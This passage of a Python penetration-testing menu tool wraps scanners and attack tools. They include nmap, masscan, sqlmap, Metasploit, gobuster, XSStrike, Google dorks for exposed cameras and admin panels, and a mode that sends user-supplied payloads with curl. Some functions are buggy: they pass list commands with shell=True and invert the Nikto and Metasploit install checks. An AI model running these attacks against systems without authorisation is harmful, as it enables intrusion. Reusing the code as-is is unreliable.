            ports = safe_input("Enter port range (e.g., 80,443 or 1-65535): ").strip()
            rate = safe_input("Enter scan rate: ").strip()
            run_masscan("Custom Scan", target, ports, rate)
        elif choice == "5":
            return
        else:
            print("❌ Invalid option. Try again.")

def install_netdiscover():
    """Attempt to install Netdiscover on Linux."""
    print("\n🔍 Checking for Netdiscover installation...")

    if shutil.which("netdiscover"):
        print("✅ Netdiscover is already installed.")
        return True
    
    print("⚠️  Netdiscover is not installed.")

    if os.name == "nt":
        print("\n❌ Netdiscover is not supported on Windows.")
        print("🔧 Please use an alternative tool such as the Nmap for live host discovery.")
        return False
    else:
        print("\n📥 Attempting to install Netdiscover (requires sudo access)...")
        try:
            subprocess.run(["sudo", "apt-get", "install", "-y", "netdiscover"], check=True)
            print("✅ Netdiscover installed successfully!")
            return True
        except Exception as e:
            print(f"❌ Installation failed: {e}")
            print("\n🔧 You can manually install it using:\n   sudo apt-get install netdiscover")
            return False
        
def run_netdiscover():
    """Run Netdiscover to identify live hosts on the local network."""
    if not install_netdiscover():
        safe_input("Returning to Network Recon & Enumeration Menu...")
        return  # Stop if Netdiscover isn't installed

    print("\n🌐 Running Netdiscover (Live Host Discovery)...")

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"netdiscover_scan_{timestamp}.txt"

    # Default to scanning the common private IP range
    network_range = "192.168.1.0/24"  # Change this based on user input later

    netdiscover_cmd = ["sudo", "netdiscover", "-r", network_range]

    print("\n🔧 Executing command:", " ".join(netdiscover_cmd))  # Debugging

    try:
        result = subprocess.run(
            netdiscover_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

        output = result.stdout.strip()
        error_output = result.stderr.strip()

        if error_output:
            print(f"⚠️   Netdiscover Error: {error_output}")

        if output:
            # Save results to a log file
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(output)

            print("\n✅ Live Hosts Detected:\n")
            print(output)

            print(f"\n✅ Scan completed! Results saved to: {log_file}")
        else:
            print("\n⚠️  No hosts detected. Try scanning a different range.")

    except KeyboardInterrupt:
        print("\n❌ Scan canceled by user. Exiting gracefully...")
    except Exception as e:
        print(f"❌ Error running Netdiscover: {e}")

def run_traceroute():
    """Run Traceroute with granular control over parameters."""
    
    target = input("\n🌐 Enter target hostname or IP for traceroute: ").strip()
    if not target:
        print("⚠️ Invalid input. Please enter a valid target.")
        return
    
    # Select the protocol for traceroute
    print("\n📌 Select Protocol for Traceroute:")
    print("1. ICMP (Default, standard traceroute)")
    print("2. UDP (Bypasses some firewall rules)")
    print("3. TCP (Used for firewall/stealth tracing)")
    
    protocol_choice = safe_input("\n🎯 Select an option (1-3): ").strip()
    
    if protocol_choice == "2":
        protocol_flag = "-U"  # UDP-based traceroute
    elif protocol_choice == "3":
        protocol_flag = "-T"  # TCP-based traceroute
    else:
        protocol_flag = ""  # Default ICMP-based traceroute

    # Max hops (TTL limit)
    max_hops = safe_input("\n🔢 Enter max hops (default: 30): ").strip()
    max_hops = max_hops if max_hops.isdigit() else "30"

    # Packet size
    packet_size = safe_input("\n📏 Enter packet size in bytes (default: 60): ").strip()
    packet_size = packet_size if packet_size.isdigit() else "60"

    # Verbose mode
    verbose = safe_input("\n🧐 Enable verbose output? (y/n): ").strip().lower()
    verbose_flag = "-v" if verbose == "y" else ""

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"traceroute_{timestamp}.txt"

    # Determine the correct command based on OS
    if os.name == "nt":
        # Windows doesn't support UDP/TCP traceroutes natively
        print("\n⚠️  Windows only supports ICMP-based tracert.")
        traceroute_cmd = ["tracert", "-h", max_hops, target]
    else:
        traceroute_cmd = [
            "sudo", "traceroute", protocol_flag, "-m", max_hops, "-q", "3",
            "-s", packet_size, verbose_flag, target
        ]
    
    # Remove empty elements from the command list
    traceroute_cmd = [arg for arg in traceroute_cmd if arg]

    print("\n🔧 Executing command:", " ".join(traceroute_cmd))  # Debugging

    try:
        result = subprocess.run(
            traceroute_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

        output = result.stdout.strip()
        error_output = result.stderr.strip()

        if error_output:
            print(f"⚠️ Traceroute Error: {error_output}")

        if output:
            # Save results to a log file
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(output)

            print("\n✅ Traceroute Results:\n")
            print(output)

            print(f"\n✅ Traceroute completed! Results saved to: {log_file}")
            safe_input("Press Enter to return to Network Recon & Enumeration menu...")
        else:
            print("\n⚠️  No output received. Check your target and try again.")
            safe_input("Press Enter to return to Network Recon & Enumeration menu...")
    except KeyboardInterrupt:
        print("\n❌ Traceroute canceled by user. Exiting gracefully...")
    except Exception as e:
        print(f"❌ Error running Traceroute: {e}")

def check_and_install_tool(tool_name, install_cmd):
    """Check if a tool is installed and ask for user consent before installing it."""
    if shutil.which(tool_name):
        return True

    print(f"⚠️ {tool_name} is not installed.")

    if os.name == "nt":
        print(f"❌ {tool_name} is not natively available on Windows.")
        print(f"🔧 Please install it manually or use alternative tools.")
        time.sleep(4)
        return False

    user_input = input(f"\n📥 {tool_name} is required. Would you like to install it now? (y/n): ").strip().lower()
    if user_input == "y":
        print(f"\n📥 Installing {tool_name} (requires sudo access)...")
        try:
            subprocess.run(install_cmd, check=True)
            print(f"✅ {tool_name} installed successfully!")
            return True
        except Exception as e:
            print(f"❌ Installation failed: {e}")
            print(f"🔧 You can manually install it using: {' '.join(install_cmd)}")
            return False
    else:
        print(f"⚠️ {tool_name} is required for this scan. Skipping...")
        return False

def smb_recon(target):
    """Perform SMB enumeration on a target system."""
    if not check_and_install_tool("smbclient", ["sudo", "apt-get", "install", "-y", "smbclient"]):
        return

    print(f"\n🌐 Running SMB Recon on {target}...\n")
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"smb_recon_{timestamp}.txt"

    smb_cmd = ["smbclient", "-L", f"//{target}/", "-N"] if os.name != "nt" else ["smbmap", "-H", target]
    
    run_scan(smb_cmd, log_file, "SMB")
    safe_input("Press Enter to return to the Network Recon menu")

def ldap_recon(target):
    """Perform LDAP enumeration on a target system."""
    if not check_and_install_tool("ldapsearch", ["sudo", "apt-get", "install", "-y", "ldap-utils"]):
        return

    print(f"\n🌐 Running LDAP Recon on {target}...\n")
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"ldap_recon_{timestamp}.txt"

    ldap_cmd = ["ldapsearch", "-x", "-H", f"ldap://{target}", "-s", "base"]
    run_scan(ldap_cmd, log_file, "LDAP")
    safe_input("Press Enter to return to the Network Recon menu")

def ftp_recon(target):
    """Perform FTP enumeration on a target system."""
    if not check_and_install_tool("nmap", ["sudo", "apt-get", "install", "-y", "nmap"]):
        return

    print(f"\n🌐 Running FTP Recon on {target}...\n")
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"ftp_recon_{timestamp}.txt"

    ftp_cmd = ["nmap", "-p", "21", "--script", "ftp-anon", target]
    run_scan(ftp_cmd, log_file, "FTP")
    safe_input("Press Enter to return to the Network Recon menu")

def run_scan(command, log_file, scan_type):
    """Execute the scan and handle output."""
    print("\n🔧 Executing command:", " ".join(command))
    
    try:
        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

        output = result.stdout.strip()
        error_output = result.stderr.strip()

        if error_output:
            print(f"⚠️ {scan_type} Recon Error: {error_output}")

        if output:
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(output)

            print(f"\n✅ {scan_type} Recon Results:\n")
            print(output)
            print(f"\n✅ {scan_type} Scan completed! Results saved to: {log_file}")
        else:
            print(f"\n⚠️ No {scan_type} services found or accessible.")

    except KeyboardInterrupt:
        print(f"\n❌ {scan_type} Recon canceled by user.")
    except Exception as e:
        print(f"❌ Error running {scan_type} Recon: {e}")

def run_service_recon():
    """Prompt user for service type and run the appropriate recon scan."""
    target = safe_input("\n🌐 Enter target IP or hostname: ").strip()

    if not target:
        print("⚠️ Invalid input. Please enter a valid target.")
        return

    print("\n📌 Select a Service to Scan:")
    print("1. SMB Recon (Windows File Shares)")
    print("2. LDAP Recon (Active Directory / Directory Services)")
    print("3. FTP Recon (Anonymous FTP & File Listings)")

    choice = input("\n🎯 Select an option (1-3): ").strip()

    if choice == "1":
        smb_recon(target)
    elif choice == "2":
        ldap_recon(target)
    elif choice == "3":
        ftp_recon(target)
    else:
        print("⚠️ Invalid choice. Please select a valid option.")

###########################################################################
#                                                                         #
#                       OSINT INVESTIGATION MENU                          #
#                                                                         #
###########################################################################

def osint_investigations_menu():
    while True:
        clear_screen()
        print("🕵️‍♂️  OSINT Investigations")
        print("1  TheHarvester (Email, Subdomain, PGP Lookup)")
        print("2  Shodan (Exposed Devices & Services)")
        print("3  Google Dorking (Search Engine Recon)")
        print("4  Social Media Footprinting")
        print("5  WHOIS & Domain Enumeration")
        print("6  Public Data Breaches & Dark Web Lookup")
        print("7  Back to Advanced Security Menu")

        choice = safe_input("Select an option: ")

        if choice == "1":
            run_theharvester()
        elif choice == "2":
            shodan_manual_search()
        elif choice == "3":
            google_dorking()
        elif choice == "4":
            social_media_footprinting()
        elif choice == "5":
            domain_enumeration()
        elif choice == "6":
            osint_breach_lookup()
        elif choice == "7":
           return
        else:
            print("This has not been implemented yet.")
            print("Returning to the Advanced Security Menu...")
            time.sleep(2)
            return
        
def check_and_install_harvester():
    """Check if TheHarvester is installed and install if user agrees."""
    if shutil.which("theHarvester"):
        return True

    print("⚠️  TheHarvester is not installed.")
    
    if os.name == "nt":
        print("❌ TheHarvester is not natively available on Windows.")
        print("🔧 Please install it manually using WSL or Kali Linux.")
        return False

    user_input = input("\n📥 TheHarvester is required. Install it now? (y/n): ").strip().lower()
    if user_input == "y":
        print("\n📥 Installing TheHarvester (requires sudo access)...")
        try:
            subprocess.run(["sudo", "apt-get", "install", "-y", "theharvester"], check=True)
            print("✅ TheHarvester installed successfully!")
            return True
        except Exception as e:
            print(f"❌ Installation failed: {e}")
            print("🔧 You can manually install it using: sudo apt-get install theharvester")
            return False
    else:
        print("⚠️ TheHarvester is required for this scan. Skipping...")
        return False

def run_theharvester():
    """Run TheHarvester for OSINT investigations."""
    if not check_and_install_harvester():
        return  # Exit if TheHarvester is missing

    target = input("\n🌐 Enter target domain or email for OSINT: ").strip()
    if not target:
        print("⚠️ Invalid input. Please enter a valid domain or email.")
        return

    print("\n📌 Select Data Sources for TheHarvester:")
    print("1. Google")
    print("2. Bing")
    print("3. LinkedIn")
    print("4. Twitter")
    print("5. All Available Sources")

    choice = safe_input("\n🎯 Select an option (1-5): ").strip()
    data_sources = {
        "1": "google",
        "2": "bing",
        "3": "linkedin",
        "4": "twitter",
        "5": "all"
    }
    source = data_sources.get(choice, "all")

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"theharvester_{timestamp}.txt"

    harvester_cmd = ["theHarvester", "-d", target, "-b", source]

    print("\n🔧 Executing command:", " ".join(harvester_cmd))  # Debugging

    try:
        result = subprocess.run(
            harvester_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

        output = result.stdout.strip()
        error_output = result.stderr.strip()

        if error_output:
            print(f"⚠️  TheHarvester Error: {error_output}")

        if output:
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(output)
            print("\n✅ TheHarvester Results:\n")
            print(output)
            print(f"\n✅ OSINT scan completed! Results saved to: {log_file}")
        else:
            print("\n⚠️  No results found for the given target.")

    except KeyboardInterrupt:
        print("\n❌ TheHarvester scan canceled by user.")
    except Exception as e:
        print(f"❌ Error running TheHarvester: {e}")

def shodan_manual_search():
    """Generate and open a Shodan search URL in the browser."""
    query = safe_input("\nEnter a search query (IP, domain, or service): ").strip()

    if not query:
        print("⚠️ Search query cannot be empty.")
        return

    # Construct the Shodan search URL
    shodan_url = f"https://www.shodan.io/search?query={query.replace(' ', '+')}"

    print(f"\n🌎 Opening Shodan search for: {query}")
    webbrowser.open(shodan_url)

def google_dorking():
    """Perform predefined or custom Google Dorking searches."""
    print("\n🔍 Google Dorking (Search Engine Recon)")
    print("1  Find PDFs on a domain")
    print("2  Find Login Pages")
    print("3  Find Open Directory Listings")
    print("4  Find Exposed Databases")
    print("5  Find Camera Feeds (Potentially Exposed)")
    print("6  Find WordPress Admin Panels")
    print("7  Advanced Search (Custom Query)")
    print("8  Back to OSINT Menu")

    choice = safe_input("\nSelect an option: ").strip()

    if choice == "1":
        domain = safe_input("Enter domain (e.g., example.com): ").strip()
        query = f"site:{domain} filetype:pdf"
    elif choice == "2":
        domain = safe_input("Enter domain (e.g., example.com): ").strip()
        query = f"site:{domain} inurl:login"
    elif choice == "3":
        domain = safe_input("Enter domain (e.g., example.com): ").strip()
        query = f'site:{domain} intitle:"index of"'
    elif choice == "4":
        domain = safe_input("Enter domain (e.g., example.com): ").strip()
        query = f'site:{domain} inurl:phpmyadmin | inurl:admin'
    elif choice == "5":
        query = 'intitle:"webcamXP 5" | inurl:"webcam7" | inurl:"view/view.shtml"'
    elif choice == "6":
        domain = safe_input("Enter domain (e.g., example.com): ").strip()
        query = f'site:{domain} inurl:wp-admin'
    elif choice == "7":
        query = safe_input("Enter custom Google Dorking query: ").strip()
    elif choice == "8":
        return  # Back to OSINT menu
    else:
        print("❌ Invalid choice. Returning to menu.")
        return

    # Open the search in the default web browser
    google_search_url = f"https://www.google.com/search?q={query}"
    print(f"\n🌐 Opening search: {google_search_url}")
    webbrowser.open(google_search_url)

    safe_input("\nPress Enter to return to the OSINT menu...")

def social_media_footprinting():
    """Perform social media footprinting searches."""
    print("\n🕵️‍♂️  Social Media Footprinting")
    print("1  Search for a username across multiple platforms")
    print("2  Find LinkedIn profiles for a company or individual")
    print("3  Search Twitter/X for public mentions")
    print("4  Search Facebook for public posts and pages")
    print("5  Advanced Custom Search")
    print("6  Back to OSINT Menu")

    choice = input("\nSelect an option: ").strip()

    if choice == "1":
        username = input("Enter username: ").strip()
        webbrowser.open(f"https://whatsmyname.app/?q={username}")
        webbrowser.open(f"https://namechk.com/")
        webbrowser.open(f"https://www.instagram.com/{username}/")
        webbrowser.open(f"https://twitter.com/{username}")
        webbrowser.open(f"https://www.tiktok.com/@{username}")
    
    elif choice == "2":
        query = input("Enter company name or individual: ").strip()
        webbrowser.open(f"https://www.google.com/search?q=site:linkedin.com/in OR site:linkedin.com/pub {query}")

    elif choice == "3":
        query = input("Enter keyword or username: ").strip()
        webbrowser.open(f"https://twitter.com/search?q={query}&src=typed_query")
    
    elif choice == "4":
        query = input("Enter keyword or person name: ").strip()
        webbrowser.open(f"https://www.google.com/search?q=site:facebook.com {query}")

    elif choice == "5":
        query = input("Enter custom search query: ").strip()
        webbrowser.open(f"https://www.google.com/search?q={query}")

    elif choice == "6":
        return  # Back to OSINT menu

    else:
        print("❌ Invalid choice. Returning to menu.")

    input("\nPress Enter to return to the OSINT menu...")

def whois_lookup_adv(domain):
    """Perform a WHOIS lookup using an external API."""
  
    try:
        w = whois.whois(domain)
        print("\n📜 WHOIS Lookup Results:\n")
        print(f"Domain Name: {w.domain_name}")
        print(f"Registrar: {w.registrar}")
        print(f"Creation Date: {w.creation_date}")
        print(f"Expiration Date: {w.expiration_date}")
        print(f"Name Servers: {w.name_servers}")
        print(f"Registrant: {w.name}")
    except Exception as e:
        print(f"\n❌ WHOIS Lookup Error: {e}")

def dns_lookup_adv(domain):
    """Retrieve basic DNS records using an external API."""
    api_url = f"https://api.hackertarget.com/dnslookup/?q={domain}"
    response = requests.get(api_url)
    
    if response.status_code == 200:
        print("\n🌐 DNS Records:\n")
        print(response.text)
    else:
        print("❌ Error retrieving DNS records.")

def subdomain_lookup(domain):
    """Find subdomains using an external API."""
    api_url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
    response = requests.get(api_url)
    
    if response.status_code == 200:
        print("\n🔍 Subdomains Found:\n")
        print(response.text)
    else:
        print("❌ Error retrieving subdomain data.")

def reverse_ip_lookup(ip):
    """Find domains hosted on the same IP address."""
    api_url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
    response = requests.get(api_url)
    
    if response.status_code == 200:
        print("\n🔁 Reverse IP Lookup Results:\n")
        print(response.text)
    else:
        print("❌ Error retrieving reverse IP data.")

def domain_enumeration():
    """Perform WHOIS & Domain Enumeration."""
    print("\n🕵️‍♂️  WHOIS & Domain Enumeration")
    print("1  WHOIS Lookup (Domain Ownership Details)")
    print("2  DNS Record Lookup (A, MX, TXT, NS)")
    print("3  Subdomain Enumeration (Find Associated Subdomains)")
    print("4  Reverse IP Lookup (Find Other Domains on Same Server)")
    print("5  Advanced Custom Search")
    print("6  Back to OSINT Menu")

    choice = safe_input("\nSelect an option: ").strip()

    if choice == "1":
        domain = safe_input("Enter a domain (e.g., example.com): ").strip()
        whois_lookup_adv(domain)

    elif choice == "2":
        domain = safe_input("Enter a domain for DNS lookup: ").strip()
        dns_lookup_adv(domain)

    elif choice == "3":
        domain = safe_input("Enter a domain to find subdomains: ").strip()
        subdomain_lookup(domain)

    elif choice == "4":
        ip = safe_input("Enter an IP address for reverse lookup: ").strip()
        reverse_ip_lookup(ip)

    elif choice == "5":
        query = safe_input("Enter a custom domain-related search query: ").strip()
        webbrowser.open(f"https://www.google.com/search?q={query}")

    elif choice == "6":
        return  # Back to OSINT menu

    else:
        print("❌ Invalid choice. Returning to menu.")

    safe_input("\nPress Enter to return to the OSINT menu...")

def dark_web_search():
    """Search Ahmia for Dark Web Mentions."""
    query = safe_input("Enter a name, email, or company to search on the dark web: ")
    search_url = f"https://ahmia.fi/search/?q={query}"
    print(f"\n🔍 Searching Ahmia: {search_url}\n")
    webbrowser.open(search_url)

def check_tor_exit_node():
    """Check if an IP is a known TOR exit node."""
    ip = safe_input("Enter an IP address to check: ")
    tor_exit_list_url = "https://check.torproject.org/exit-addresses"
    
    try:
        response = requests.get(tor_exit_list_url)
        if ip in response.text:
            print(f"\n🚨 The IP {ip} is a known TOR exit node!\n")
        else:
            print(f"\n✅ The IP {ip} is NOT found in the TOR exit list.\n")
    except requests.RequestException as e:
        print(f"❌ Error fetching TOR exit node list: {e}")

def google_pastebin_search():
    """Perform a Google search for Pastebin leaks."""
    query = safe_input("Enter an email, username, or company name: ")
    google_url = f"https://www.google.com/search?q=site:pastebin.com+\"{query}\""
    print(f"\n🔍 Searching Google for public pastes: {google_url}\n")
    webbrowser.open(google_url)

def osint_breach_lookup():
    """Public Data Breach & Dark Web Lookup Menu."""
    while True:
        print("\n🕵️‍♂️  Public Data Breaches & Dark Web Lookup")
        print("1  Dark Web Mentions (Ahmia & Onion Search)")
        print("2  Check if an IP is a known TOR exit node")
        print("3  Google Pastebin Search for Public Data")
        print("4  Back to OSINT Menu")
        
        choice = safe_input("Select an option: ")
        
        if choice == "1":
            dark_web_search()
        elif choice == "2":
            check_tor_exit_node()
        elif choice == "3":
            google_pastebin_search()
        elif choice == "4":
            break
        else:
            print("❌ Invalid option. Please try again.")

###########################################################################
#                                                                         #
#                          VULNERABILITY MENU                             #
#                                                                         #
###########################################################################

def vulnerability_menu():
    """Vulnerability Scanning & Exploitation Menu"""
    while True:
        clear_screen()
        print("\n🛡  Vulnerability Scanning & Exploitation (Linux Only)")
        print("1  Nmap Vulnerability Scan (--script vuln)")
        print("2  Nikto Web Vulnerability Scan")
        print("3  Metasploit Auxiliary Scanning")
        print("4  Search for Known Exploits (SearchSploit)")
        print("5  SQL Injection Testing (sqlmap)")
        print("6  XSS & CSRF Detection (Burp Suite/ZAP)")
        print("7  Back to Advanced Security Menu")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "1":
            if not is_tool_installed("nmap"):
                print("Nmap is not installed. Install it with: sudo apt install nmap.")
                time.sleep(3)
                return
            target = safe_input("Enter target IP or domain: ").strip()
            execute_nmap(target, ["--script", "vuln"])
        elif choice == "2":
            if is_tool_installed("nikto"):
                print("Nikto is not installed. Install it with: sudo apt install nikto.")
                time.sleep(3)
                return
            run_nikto_scan()
        elif choice == "3":
            if is_tool_installed("msfconsole"):
                print("Metasploit is not installed. Install it with: sudo apt install metasploit-framework.")
                time.sleep(3)
                return
            run_metasploit_scan()
        elif choice == "4":
            if not is_tool_installed("searchsploit"):
                print("SearchSploit is not installed. Install it with: sudo apt install exploitdb.")
                time.sleep(3)
                return
            search_exploits()
        elif choice == "5":
            if not is_tool_installed("sqlmap"):
                print("SQLMap is not installed. Install it with: sudo apt install sqlmap.")
                time.sleep(3)
                return
            run_sqlmap()
        elif choice == "6":
            if not is_tool_installed("zap-cli") and not is_tool_installed("burpsuite"):
                print("Neither OWASP ZAP nor Burp Suite is installed. Install them first.")
                time.sleep(3)
                return
            run_burp_zap_scan()
        elif choice == "7":
            return  # Go back
        else:
            print("Invalid choice. Try again.")

def is_tool_installed(tool_name):
    return shutil.which(tool_name) is not None

def is_metasploit_running():
    result = subprocess.run(["pgrep", "-f", "msfconsole"], capture_output=True, text=True)
    return result.returncode == 0

def run_nikto_scan():
    """Run Nikto Web Vulnerability Scan"""
    target = safe_input("Enter target URL (e.g., http://example.com): ").strip()
    if not target.startswith("http"):
        print("❌ Invalid URL format. Include http:// or https://")
        return
    
    log_file = f"nikto_scan_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    print(f"\n🔍 Running Nikto scan on {target}...\n")
    command = ["nikto", "-h", target, "-o", log_file]
    execute_command(command, log_file)

def run_metasploit_scan():
    """Run Metasploit Auxiliary Scan with session handling."""
    
    if is_metasploit_running():
        print("\n⚠️  An existing Metasploit session is running.")
        print("1  Attach to the running session")
        print("2  Kill the existing session and start fresh")
        print("3  Start a new session in parallel (not recommended)")
        print("4  Cancel and return")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "1":
            print("\n🔄 Attaching to the existing Metasploit session...")
            subprocess.run(["tmux", "attach-session", "-t", "msfconsole"], check=False)
            return

        elif choice == "2":
            print("\n🛑 Killing the existing Metasploit session...")
            subprocess.run(["pkill", "-f", "msfconsole"], check=False)
            print("✅ Metasploit session terminated.")
        
        elif choice == "3":
            print("\n⚠️  Warning: Running multiple Metasploit sessions may cause conflicts.")
            confirm = safe_input("Are you sure you want to continue? (y/n): ").strip().lower()
            if confirm != "y":
                return

        elif choice == "4":
            print("Returning to menu...")
            return

    print("\n⚡ Launching Metasploit Auxiliary Scanner...")
    print("(This requires Metasploit to be installed and configured.)")

    module = safe_input("Enter Metasploit module (e.g., auxiliary/scanner/portscan/tcp): ").strip()
    target = safe_input("Enter target IP: ").strip()

    # Start Metasploit inside a tmux session for persistence
    print("\n🚀 Starting Metasploit in a new session...")
    subprocess.run(["tmux", "new-session", "-d", "-s", "msfconsole", "msfconsole"], check=False)

    # Send commands to Metasploit session
    time.sleep(2)  # Wait for Metasploit to initialize
    subprocess.run(["tmux", "send-keys", "-t", "msfconsole", f"use {module}", "Enter"])
    subprocess.run(["tmux", "send-keys", "-t", "msfconsole", f"set RHOSTS {target}", "Enter"])
    subprocess.run(["tmux", "send-keys", "-t", "msfconsole", "run", "Enter"])

    print("\n✅ Metasploit session started. Use `tmux attach -t msfconsole` to interact.")
    print("To detach from the session, press `CTRL+B` followed by `D`.")

    safe_input("\nPress Enter to return to the menu.")

def search_exploits():
    """Search for exploits using SearchSploit"""
    query = safe_input("Enter exploit search query (e.g., Apache, RCE, CVE-2024-XXXX): ").strip()
    print(f"\n🔎 Searching for exploits related to '{query}'...\n")
    command = ["searchsploit", query]
    execute_command(command, "searchsploit_results.txt")

def run_sqlmap():
    """Run SQL Injection Testing with sqlmap"""
    target = safe_input("Enter target URL with parameter (e.g., http://example.com/page.php?id=1): ").strip()
    if "=" not in target:
        print("❌ Invalid URL. Ensure it has a query parameter (e.g., id=1)")
        return
    
    log_file = f"sqlmap_scan_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    print(f"\n💉 Running SQL Injection test on {target}...\n")
    command = ["sqlmap", "-u", target, "--batch", "--output-dir=logs"]
    execute_command(command, log_file)

def run_burp_zap_scan():
    """Run XSS & CSRF Detection using OWASP ZAP"""
    target = safe_input("Enter target URL (e.g., http://example.com): ").strip()
    if not target.startswith("http"):
        print("❌ Invalid URL format. Include http:// or https://")
        return
    
    print(f"\n🕵️ Running OWASP ZAP scan on {target}...")
    command = ["zap-cli", "quick-scan", target]
    execute_command(command, "zap_scan.log")

def execute_command(command, log_file):
    """Run a command and log output to a file."""
    try:
        with open(log_file, "w", encoding="utf-8") as log:
            with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1) as proc:
                for line in proc.stdout:
                    print(line, end="")  # Live output
                    log.write(line)  # Save to log file

        print(f"\n✅ Scan complete. Results saved to {log_file}")
    except Exception as e:
        print(f"❌ Error executing command: {e}")

def web_security_menu():
    """Web Application Security Testing Menu"""
    while True:
        clear_screen()
        print("\n🌐  Web Application Security (Linux Only)")
        print("1  Web Proxy & Manual Testing (Burp Suite/ZAP)")
        print("2  Directory & File Bruteforce (WFuzz/Gobuster)")
        print("3  SQL Injection Testing (SQLMap)")
        print("4  XSS & CSRF Detection (XSStrike/Burp Suite)")
        print("5  Web Server Security Scan (Nikto)")
        print("6  Web Technology Fingerprinting (WhatWeb)")
        print("7  JWT Security Analysis (JWT Tool)")
        print("8  Custom Web Exploitation Mode")
        print("9  Web Crawler")
        print("10  Back to Advanced Security Menu")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "1":
            run_burp_zap()
        elif choice == "2":
            run_dir_bruteforce()
        elif choice == "3":
            run_sqlmap()
        elif choice == "4":
            run_xss_csrf_test()
        elif choice == "5":
            run_nikto_scan()
        elif choice == "6":
            run_whatweb_scan()
        elif choice == "7":
            run_jwt_tool()
        elif choice == "8":
            custom_web_exploit()
        elif choice == "9":
            web_crawler()
        elif choice == "10":
            return  # Go back
        else:
            print("❌ Invalid choice. Try again.")

def run_burp_zap():
    """Launch Burp Suite or OWASP ZAP"""
    print("\n🌐 Web Proxy Testing")
    print("1  Burp Suite")
    print("2  OWASP ZAP")
    print("3  Back")

    proxy_choice = safe_input("\nSelect an option: ").strip()

    if proxy_choice == "1":
        print("\n🚀 Launching Burp Suite...")
        subprocess.run(["burpsuite"], check=False)
    elif proxy_choice == "2":
        print("\n🚀 Launching OWASP ZAP...")
        subprocess.run(["zap"], check=False)
    elif proxy_choice == "3":
        return
    else:
        print("❌ Invalid option. Try again.")

def run_dir_bruteforce():
    """Run Gobuster or WFuzz for Directory Bruteforcing"""
    target = safe_input("Enter target URL (e.g., http://example.com): ").strip()
    wordlist = safe_input("Enter path to wordlist (default: /usr/share/wordlists/dirb/common.txt): ").strip() or "/usr/share/wordlists/dirb/common.txt"

    print("\n📂 Choose a tool:")
    print("1  Gobuster")
    print("2  WFuzz")
    print("3  Back")

    tool_choice = safe_input("\nSelect an option: ").strip()

    if tool_choice == "1":
        print("\n🚀 Running Gobuster...")
        command = ["gobuster", "dir", "-u", target, "-w", wordlist, "-t", "50"]
        execute_command(command, "gobuster_scan.log")
    elif tool_choice == "2":
        print("\n🚀 Running WFuzz...")
        command = ["wfuzz", "-c", "-w", wordlist, "--hc", "404", f"{target}/FUZZ"]
        execute_command(command, "wfuzz_scan.log")
    elif tool_choice == "3":
        return
    else:
        print("❌ Invalid option. Try again.")

def run_xss_csrf_test():
    """Test for XSS & CSRF vulnerabilities"""
    target = safe_input("Enter target URL with parameter (e.g., http://example.com/search?q=test): ").strip()

    print("\n🛑 Choose attack method:")
    print("1  XSS Testing (XSStrike)")
    print("2  CSRF Testing (Burp Suite)")
    print("3  Back")

    attack_choice = safe_input("\nSelect an option: ").strip()

    if attack_choice == "1":
        print("\n🚀 Running XSStrike for XSS Testing...")
        command = ["xsstrike", "-u", target, "--crawl"]
        execute_command(command, "xsstrike_scan.log")
    elif attack_choice == "2":
        print("\n🛠️ Launching Burp Suite for manual CSRF testing...")
        subprocess.run(["burpsuite"], check=False)
    elif attack_choice == "3":
        return
    else:
        print("❌ Invalid option. Try again.")

def run_whatweb_scan():
    """Identify web technologies with WhatWeb"""
    target = safe_input("Enter target URL (e.g., http://example.com): ").strip()
    print("\n🔍 Running WhatWeb technology fingerprinting...")
    command = ["whatweb", target]
    execute_command(command, "whatweb_results.txt")

def run_jwt_tool():
    """Analyze JSON Web Tokens (JWTs)"""
    jwt_token = safe_input("Enter JWT token: ").strip()

    print("\n🔍 Running JWT analysis...")
    command = ["jwt-tool", jwt_token]
    execute_command(command, "jwt_analysis.txt")

def custom_web_exploit():
    """Allow users to define their own web attack scenario"""
    target = safe_input("Enter target URL (e.g., http://example.com): ").strip()
    attack_type = safe_input("Describe your attack goal (e.g., SQLi, XSS, LFI, SSTI): ").strip()

    print(f"\n🛠 Custom Web Exploitation Mode - Target: {target}")
    print(f"⚡ Attack Type: {attack_type}")

    payload = safe_input("Enter custom payload or attack vector: ").strip()
    method = safe_input("Enter HTTP method (GET/POST/PUT/etc.): ").strip().upper()

    print("\n🚀 Launching attack...\n")

    # Example request structure
    command = ["curl", "-X", method, "-d", payload, target]
    execute_command(command, "custom_web_attack.log")

# Global variables to store findings
discovered_forms = []
exposed_files = []
visited_urls = set()
session = requests.Session()

def fetch_page(url):
    """Fetch a webpage with rate limiting and retries."""
    try:
        time.sleep(1)  # Rate limit
        response = session.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"❌ Failed to fetch {url}: {e}")
        return None

def extract_forms(url, soup):
    """Extract forms and check for missing CSRF tokens."""
    forms = soup.find_all("form")
    for form in forms:
        action = form.get("action", "N/A")
